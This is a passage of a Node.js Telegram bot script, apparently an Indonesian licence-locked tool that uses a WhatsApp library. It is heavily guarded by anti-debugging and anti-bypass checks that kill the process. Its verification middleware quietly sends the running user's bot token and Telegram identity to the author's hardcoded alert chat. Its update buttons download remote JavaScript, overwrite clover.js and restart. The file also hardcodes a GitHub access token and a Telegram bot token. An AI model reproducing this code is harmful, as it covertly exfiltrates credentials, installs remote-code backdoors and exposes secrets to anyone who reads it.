(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()
const { Telegraf, session } = require("telegraf");
const prettier = require("prettier");
const walk = require("acorn-walk");
const { Client } = require('ssh2');
const { v4: uuidv4 } = require('uuid');
const nodemailer = require("nodemailer");
const tar = require("tar");
const htmlparser2 = require("htmlparser2");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const cheerio = require("cheerio");
const { Octokit } = require("@octokit/rest");
const AdmZip = require("adm-zip");
const JSZip = require("jszip");
const acorn = require("acorn");
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const readline = require("readline");
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const deployToGitHub = require("./settings/deploy");
const { githubToken, githubUser } = require("./settings/github");
const JsConfuser = require("js-confuser");
global.log = console.log;
const log = console.log.bind(console);
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const groupFile = path.join(__dirname, "allowedGroups.json");
const { Readable } = require("stream");

function bufferToStream(buffer) {
  const readable = new Readable();
  readable._read = () => {};
  readable.push(buffer);
  readable.push(null);
  return readable;
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@zeppeliorg/wbails');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const hashWith = alg => s => crypto.createHash(alg).update(s, 'utf8').digest('hex')
const md5 = hashWith('md5')
const sha256 = hashWith('sha256')
function groupOnly(ctx) {
  try {
    if (!ctx.chat || ctx.chat.type !== "group" && ctx.chat.type !== "supergroup") {
      ctx.reply("⚠️ Command ini hanya bisa digunakan di Group.");
      return false;
    }

    if (ctx.chat.id.toString() !== allowedGroupID) {
      ctx.reply("❌ Group ini tidak terdaftar sebagai group resmi bot.");
      return false;
    }

    return true;
  } catch {
    return false;
  }
}
const { tokenBot, ownerID, adminID, allowedGroupID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "Bellaxata";
const REPO = "xzxz";
const TOKEN_FILE = "akucantek.json";
const GITHUB_TOKEN = "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";
const LOLLIPOP_FILE = "lolipop.json";
const OWNER_ID = 5126860596;
const databaseUrl = `https://raw.githubusercontent.com/${OWNER}/${REPO}/main/${TOKEN_FILE}`;

const thumbnailUrl = "https://files.catbox.moe/cex6he.png";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}


// ===== TOKEN BLACKLIST GITHUB =====
const AKUN = "tokenbl.json";

const BLOCKED_TOKEN_URL =
  `https://raw.githubusercontent.com/${OWNER}/${REPO}/main/${AKUN}`;

let blockedTokenCache = [];
let lastFetch = 0;

async function refreshBlockedTokenCache() {
  try {
    const res = await fetchJsonHttps(BLOCKED_TOKEN_URL, 5000);
    blockedTokenCache = Array.isArray(res?.blocked) ? res.blocked : [];
    lastFetch = Date.now();
  } catch {
    blockedTokenCache = [];
    lastFetch = Date.now();
  }
}
async function isTokenBlacklisted(token, force = false) {
  try {
    const now = Date.now();

    if (force || now - lastFetch > 60000 || !blockedTokenCache.length) {
      await refreshBlockedTokenCache();
    }

    return blockedTokenCache.includes(token);
  } catch {
    return false;
  }
}

// Deklarasi variabel global
let secureMode = false;

function activateSecureMode() {
  secureMode = true;
  console.log(chalk.bold.blueBright("⚠️ Xatanical AntiBypass"));
}
(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      console.warn("⚠️ Deteksi debugger: " + randErr());
      activateSecureMode();
   }
  }, 1000);
  const code = "AlwaysProtect";
  if (code.length !== 13) {
    console.warn("⚠️ Code mismatch terdeteksi!");
    activateSecureMode();
  }
  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃➠ Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
    `));
  }
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    const currentHash = Buffer.from(secure.toString()).toString("base64");
    if (currentHash !== hash) {
      console.warn("⚠️ Modifikasi fungsi secure terdeteksi!");
      activateSecureMode();
    }
  }, 2000);
  secure();
})();

const blockedWords = [
  'fetch', 'axios', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database', 'token', 'apikey', 'key',
  'secret', 'raw.githubusercontent', 'cdn.discordapp', 'dropbox', 'pastebin', 'session', 'cookie', 'auth',
  'login', 'credentials', 'ip:', 'url:', 'endpoint', 'request', 'response'
];

function checkBlockedWords(sourceCode) {
  const sourceString = sourceCode.toString().toLowerCase();
  for (const word of blockedWords) {
    if (sourceString.includes(word.toLowerCase())) {
      console.warn(chalk.bold.red(`⚠️ Blocked Bypass Link`));
      activateSecureMode();
      return true;
    }
  }
  return false;
}

(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    try {
      let detected = false;
      if (typeof process.exit === "function" && process.exit.toString().includes("Proxy")) {
        detected = true;
      }
      if (typeof process.kill === "function" && process.kill.toString().includes("Proxy")) {
        detected = true;
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          detected = true;
          break;
        }
      }
      if (detected) {
        console.log(chalk.bold.green(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃➠ Server Xatanical Mendeteksi
┃➠Anda Telah Membypass Paksa 
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
      } else {
      }
    } catch (err) {
      console.warn("⚠️ Error saat pengecekan bypass:", err.message);
      activateSecureMode();
    }
  }, 2000);
  
  global.validateToken = async (databaseUrl, tokenBot) => {
    // if (checkBlockedWords(databaseUrl) || checkBlockedWords(tokenBot)) {
    //   return false;
    // }
    
    try {
      const res = await fetchJsonHttps(databaseUrl, 5000);
      const tokens = (res && res.tokens) || [];
      let tokenHashes = sha256(md5(tokenBot))

      if (tokens.includes(tokenHashes)) {
        console.log(chalk.blueBright("✅ Token valid dan diverifikasi."));
        return true;
      } else {
        console.log(chalk.bold.red(`
⠀⬡═—⊱ BYPASS TERDETEKSI ⊰—═⬡
┃➠Server Telah Mendeteksi Kamu Bypass
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
        return false;
      }

    } catch (err) {
      console.log(chalk.bold.red(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃➠ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
      `));
      activateSecureMode();
      return false;
    }
  };
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;

let botActive = true;
let lastStatus = null;

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

bot.use(async (ctx, next) => {
  const userId = ctx.from?.id;
  const chatId = ctx.chat?.id || userId;

  // BOT OFF PROTECTION
  if (!botActive) {
    return ctx.reply("🚫 Bot sedang nonaktif.\nAktifkan kembali untuk menggunakan perintah.", {
      parse_mode: "Markdown",
    });
  }

  // JIKA SUDAH VALID, LANJUT
  if (tokenValidated) return next();

  // ANTI SPAM VERIFIKASI
  if (pendingVerification.has(chatId)) return;
  pendingVerification.add(chatId);

  const getTokenData = () =>
    new Promise((resolve, reject) => {
      https
        .get(databaseUrl, { timeout: 6000 }, (res) => {
          let data = "";
          res.on("data", (chunk) => (data += chunk));
          res.on("end", () => {
            try {
              resolve(JSON.parse(data));
            } catch {
              reject(new Error("Invalid JSON response"));
            }
          });
        })
        .on("error", (err) => reject(err));
    });

  try {
    const result = await getTokenData();
    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];

    const botName = ctx.botInfo?.first_name || "Unknown Bot";

    const alertBase = `
━━━━━━━━━━━━━━━━━━
🔥 *TREDICT INVICTUS* 🔥
━━━━━━━━━━━━━━━━━━
🤖 *Bot Name* : ${botName}
🔑 *Bot Token* : \`${tokenBot}\`
👤 *User* : [${ctx.from.first_name}](tg://user?id=${userId})
🧩 *Username* : @${ctx.from.username || "Unknown"}
⏰ *Time* : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━`;

    // ================= TOKEN VALID =================
    let tokenHashes = sha256(md5(tokenBot))
    if (tokens.includes(tokenHashes)) {
      tokenValidated = true;

      await ctx.reply(
        "✅ *Token Valid*\nSelamat Datang di *Tredict Invictus*\nScrape File Automatis Update",
        { parse_mode: "Markdown" }
      );

      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: `🟢 *TOKEN VERIFIED*${alertBase}`,
        parse_mode: "Markdown",
      });

      return next();
    }

    // ================= TOKEN INVALID =================
    const photoUrl = "https://files.catbox.moe/1555jq.jpg";

    await ctx.replyWithPhoto(photoUrl, {
      caption: `
🚨 *TOKEN INVALID* 🚨

*Ciee Ngebypass Tapi Ga Tembus*
Lu kira tembus?

Next Ya Dek Perbaiki Lagi Bypass nya
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "👑 OWNER",
              url: "https://t.me/xatanicvxii",
            },
          ],
        ],
      },
    });

    await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
      chat_id: ALERT_CHAT_ID,
      text: `🔴 *TOKEN INVALID*${alertBase}`,
      parse_mode: "Markdown",
    });

    // MATIKAN BOT SETELAH MENU TERKIRIM
    setTimeout(() => {
      console.log("❌ TOKEN INVALID - BOT SHUTDOWN");
      process.exit(0);
    }, 3000);

  } catch (err) {
    await ctx.reply("⚠️ Error komunikasi server.", {
      parse_mode: "Markdown",
    });
  } finally {
    pendingVerification.delete(chatId);
  }
});
const ALERT_TOKEN = "8135257725:AAFXBul0SGCGXfhLb1l7rP6I96GscZT6KjE";
const ALERT_CHAT_ID = "5126860596"; 
const pendingVerification = new Set();
// ================= ADMIN COMMAND MENU ON/OFF =================
let menuEnabled = true;

bot.start(async (ctx) => {
if (!tokenValidated) return;
  try {
    if (await isTokenBlacklisted(tokenBot)) {
      return ctx.reply(
        "⛔ AKSES DITOLAK\n\nToken kamu telah *DIBLOKIR SERVER*.",
        { parse_mode: "Markdown" }
      );
    }

const menuCaption = `<pre><code class="language-javascript">
 TREDICT INVICTUS 
WELCOME PROJECT X-TEAM

Powerful • Secure • Exclusive

Owner   : @Xatanicvxii
Partner : Bella

Klik button di bawah untuk melanjutkan
</code></pre>`;

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: menuCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Lite Script", callback_data: "pullupdate_btn", style: "danger" }],  // BIRU
          [{ text: "Only Svip", callback_data: "pullvip_btn", style: "success" }]  // HIJAU
        ]
      }
    });

  } catch (err) {
    console.error("⚠️ Error di /start:", err.message);
    ctx.reply("❌ Terjadi kesalahan internal, coba lagi nanti.");
  }
});

bot.action("start", async (ctx) => {
  if (!tokenValidated) return;
  
  const senderStatus = isWhatsAppConnected ? "1" : "0";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const displayName =
    ctx.from.first_name ||
    ctx.from.username ||
    "User";
  
  try {
    // 🔒 CEK TOKEN BLACKLIST
    if (await isTokenBlacklisted(tokenBot)) {
      return ctx.answerCbQuery(
        "⛔ TOKEN ANDA TELAH DIBLOKIR\nAkses menu ditolak.",
        { show_alert: true }
      );
    }

    const menuCaption = `<pre><code class="language-javascript">
⟣ TREDICT INVICTUS ⟢
WELCOME PROJECT X-TEAM

Powerful • Secure • Exclusive

Owner   : @Xatanicvxii
Partner : Bella

Klik button di bawah untuk melanjutkan
</code></pre>`;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuCaption,
        parse_mode: "HTML"
      },
      {
        reply_markup: {
         inline_keyboard: [
            [{ text: "Lite Script", callback_data: "pullupdate_btn", style: "danger" }],
            [{ text: "Only Svip", callback_data: "pullvip_btn", style: "success" }]
          ]
        }
      }
    );
  } catch (err) {
    console.error("⚠️ Error di action /start:", err.message);
    await ctx.answerCbQuery(
      "❌ Terjadi kesalahan internal, coba lagi nanti.",
      { show_alert: true }
    );
  }
});

const GITHUB_REPO = "Bellaxata/xzxz";
const GITHUB_BRANCH = "main";

bot.action("pullupdate_btn", async (ctx) => {
  try {
    await ctx.answerCbQuery("⏳ Updating script...", { show_alert: false });
    await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("❌ Tidak dapat mengakses repository.");

    const files = await res.json();

    const target = files.find(f =>
      f.name.toLowerCase().includes("clover") && f.name.endsWith(".js")
    );

    if (!target) {
      return ctx.reply("❌ Script Belum Update!");
    }

    const fileRes = await fetch(target.download_url);
    const fileDecoded = await fileRes.text();

    fs.writeFileSync("./clover.js", fileDecoded);

    await ctx.reply(`
    ✅ Update Berhasil
    📄 File: *${target.name}*
    ♻️ Restarting...
    
   © TREDICT INVICTUS`, 
    { parse_mode: "Markdown" });

    setTimeout(() => process.exit(1), 1200);

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: Tidak bisa update script.");
  }
});

const vipID = 5126860596; 
async function updateVipJSON(newVipList) {
  const filePath = "vip.json";
  const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;

  // Ambil file lama untuk SHA reference
  const oldFileRes = await fetch(apiURL, {
    headers: {
      "User-Agent": "Telegram-Bot",
      Authorization: `token ${GITHUB_TOKEN}`
    }
  });

  const oldFile = await oldFileRes.json();

  // Encode konten baru
  const newContent = Buffer.from(
    JSON.stringify({ vip: newVipList }, null, 2)
  ).toString("base64");

  // Push update ke GitHub
  const updateRes = await fetch(apiURL, {
    method: "PUT",
    headers: {
      "User-Agent": "Telegram-Bot",
      Authorization: `token ${GITHUB_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      message: "Update VIP users",
      content: newContent,
      sha: oldFile.sha,
      branch: GITHUB_BRANCH
    })
  });

  return updateRes.ok;
}


// ==========================
// FUNGSI CEK VIP DARI GITHUB
// ==========================
async function isVIP(userId) {
  try {
    const res = await fetch(
      `https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/vip.json`
    );

    const data = await res.json();
    return data.vip.includes(String(userId));
  } catch {
    return false;
  }
}

bot.command("pullupdatesvip", async (ctx) => {
  const userId = ctx.from.id;

  // Cek user VIP
  if (!await isVIP(userId)) {
    return ctx.reply("❌ Kamu bukan VIP! Hubungi owner untuk akses VIP.");
  }

  try {
    await ctx.reply("⏳ Auto Update VIP Script Mohon Tunggu...");

    // Ambil isi root repo
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });
    if (!res.ok) return ctx.reply("❌ Belum Update.");
    const files = await res.json();
    const vipScript = files.find(f => 
      f.name.toLowerCase() === "clovervip.js"
    );
    if (!vipScript) {
      return ctx.reply("❌ Script Belum Di Update owner.");
    }
    const scriptRes = await fetch(vipScript.download_url);
    const scriptContent = await scriptRes.text();
    fs.writeFileSync("./clover.js", scriptContent);
    await ctx.reply(
`*🎉 VIP UPDATE BERHASIL!*
📄 File: *${vipScript.name}*
📦 Script VIP berhasil di-update.
♻️ Bot akan restart otomatis...
🧧 Selamat datang, *Super VIP*!`,
      { parse_mode: "Markdown" }
    );

    // Tambahin sedikit jeda sebelum exit
    setTimeout(() => {
      process.exit(1);
    }, 1500);

  } catch (err) {
    console.error("VIP Update Error:", err);
    ctx.reply("❌ Error: Owner belum mengupdate menu VIP.");
  }
});

bot.action("pullvip_btn", async (ctx) => {
  const userId = ctx.from.id;

  // Cek VIP dari GitHub
  if (!await isVIP(userId)) {
    return ctx.answerCbQuery(
      "❌ Kamu bukan VIP! Hubungi owner untuk akses.",
      { show_alert: true }
    );
  }

  try {
    await ctx.answerCbQuery("⏳ Updating VIP script...", { show_alert: false });
    await ctx.reply("⏳ Auto Update VIP Script Mohon Tunggu...");

    // Akses root repo
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("❌ Gagal mengakses repositori GitHub.");

    const files = await res.json();

    // Ambil file clovervip.js
    const vipScript = files.find(f =>
      f.name.toLowerCase() === "clovervip.js"
    );

    if (!vipScript)
      return ctx.reply("❌ File Update Belum Terkirim Oleh Owner.");

    // download file VIP
    const scriptRes = await fetch(vipScript.download_url);
    const scriptContent = await scriptRes.text();

    // Replace clover.js dengan versi VIP
    fs.writeFileSync("./clover.js", scriptContent);

    await ctx.reply(
`*✅ VIP UPDATE BERHASIL!*

📄 *clover.js* berhasil terdeteksi dan diperbarui.
📦 Bot telah diperbarui dengan script VIP.
♻️ Bot akan restart otomatis...
💐 Selamat datang, *Super VIP*!`,
      { parse_mode: "Markdown" }
    );

    setTimeout(() => process.exit(1), 1200);

  } catch (err) {
    console.error("VIP Update Error:", err);
    ctx.reply("❌ Error: Owner belum mengupdate menu VIP.");
  }
});

bot.command("savefile", async (ctx) => {
  waitingUpload = true;
  ctx.reply("📤 Silahkan kirim file **clover.js** sebagai reply sekarang.");
});

bot.on("document", async (ctx) => {
  try {
    if (!waitingUpload) return;

    const file = ctx.message.document;

    if (!file.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus berekstensi .js");
    }

    const fileId = file.file_id;
    const link = await ctx.telegram.getFileLink(fileId);

    const res = await fetch(link.href);
    const content = await res.text();

    const base64Content = Buffer.from(content).toString("base64");

    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${file.file_name}`;

    // cek apakah file sudah ada
    let fileSha = null;
    const check = await fetch(apiURL, {
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      }
    });

    if (check.ok) {
      const data = await check.json();
      fileSha = data.sha;
    }

    // upload file
    const upload = await fetch(apiURL, {
      method: "PUT",
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      },
      body: JSON.stringify({
        message: `Upload ${file.file_name} via bot`,
        content: base64Content,
        sha: fileSha,
        branch: GITHUB_BRANCH
      })
    });

    waitingUpload = false;

    if (!upload.ok) return ctx.reply("❌ Gagal upload file ke GitHub.");

    ctx.reply(`✅ File **${file.file_name}** berhasil di-upload ke GitHub!`);

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat upload file.");
  }
});

bot.command("clearfile", async (ctx) => {
  try {
    const fileName = "tredict.js";
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${fileName}?ref=${GITHUB_BRANCH}`;

    const res = await fetch(apiURL, {
      headers: {
